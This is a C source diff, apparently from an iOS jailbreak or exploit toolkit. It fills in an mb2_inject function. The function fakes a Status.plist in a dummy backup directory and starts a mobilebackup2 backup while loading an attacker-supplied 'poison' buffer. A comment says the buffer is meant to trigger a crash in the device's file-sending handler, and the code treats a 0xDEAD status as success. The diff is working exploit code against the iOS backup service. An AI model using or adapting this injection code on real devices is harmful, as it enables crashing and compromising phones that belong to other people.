@@ -27,6 +27,7 @@
 
 #include "mb2.h"
 #include "debug.h"
+#include "dictionary.h"
 #include "plist_extras.h"
 #include "endianness.h"
 #include "common.h"
@@ -1047,8 +1048,66 @@ int mb2_crash(mb2_t* mb2) {
 	}
 }
 
-int mb2_inject(mb2_t* mb2) {
-	return 0;
+int mb2_inject(mb2_t* mb2, char* data, int size) {
+	double local_versions[2] = { 2.0, 2.1 };
+	double remote_version = 0.0;
+	mobilebackup2_error_t err = mobilebackup2_version_exchange(mb2->client, local_versions, 2, &remote_version);
+	if (err != MOBILEBACKUP2_E_SUCCESS) {
+		printf("Could not perform backup protocol version exchange, error code %d\n", err);
+		return -1;
+	}
+
+	printf("Negotiated Protocol Version %.1f\n", remote_version);
+
+	printf("Starting backup...\n");
+
+	mkdir_with_parents(DUMMYBACKUPDIR, 0755);
+
+	/* make sure backup device sub-directory exists */
+	char *devbackupdir = build_path(DUMMYBACKUPDIR, mb2->device->uuid, NULL);
+	mkdir_with_parents(devbackupdir, 0755);
+
+	char *statusplist = build_path(devbackupdir, "Status.plist", NULL);
+	free(devbackupdir);
+
+	plist_t stpl = plist_new_dict();
+	plist_dict_insert_item(stpl, "UUID", plist_new_string("whatever"));
+	plist_dict_insert_item(stpl, "IsFullBackup", plist_new_bool(0));
+	plist_dict_insert_item(stpl, "Version", plist_new_string("2.4"));
+	plist_dict_insert_item(stpl, "BackupState", plist_new_string("new"));
+	plist_dict_insert_item(stpl, "Date", plist_new_date(time(NULL), 0));
+
+	plist_dict_insert_item(stpl, "SnapshotState", plist_new_string("finished"));
+	plist_write_to_filename(stpl, statusplist, PLIST_FORMAT_BINARY);
+	plist_free(stpl);
+	free(statusplist);
+
+	char* poison_buf = data;
+	int poison_length = size;
+
+	err = mobilebackup2_send_request(mb2->client, "Backup", mb2->device->uuid, NULL, NULL);
+	if (err == MOBILEBACKUP2_E_SUCCESS) {
+		// enable crashing in mb2_handle_send_files()
+
+		mb2->poison = poison_buf;
+		mb2->poison_length = poison_length;
+	} else {
+		if (err == MOBILEBACKUP2_E_BAD_VERSION) {
+			printf("ERROR: Could not start backup process: backup protocol version mismatch!\n");
+		} else if (err == MOBILEBACKUP2_E_REPLY_NOT_OK) {
+			printf("ERROR: Could not start backup process: device refused to start the backup process.\n");
+		} else {
+			printf("ERROR: Could not start backup process: unspecified error occured\n");
+		}
+	}
+
+	int processStatus = mb2_process_messages(mb2, DUMMYBACKUPDIR);
+
+	if (processStatus == 0xDEAD) {
+		return 0;
+	} else {
+		return -1;
+	}
 }
 
 int mb2_exploit(mb2_t* mb2) {
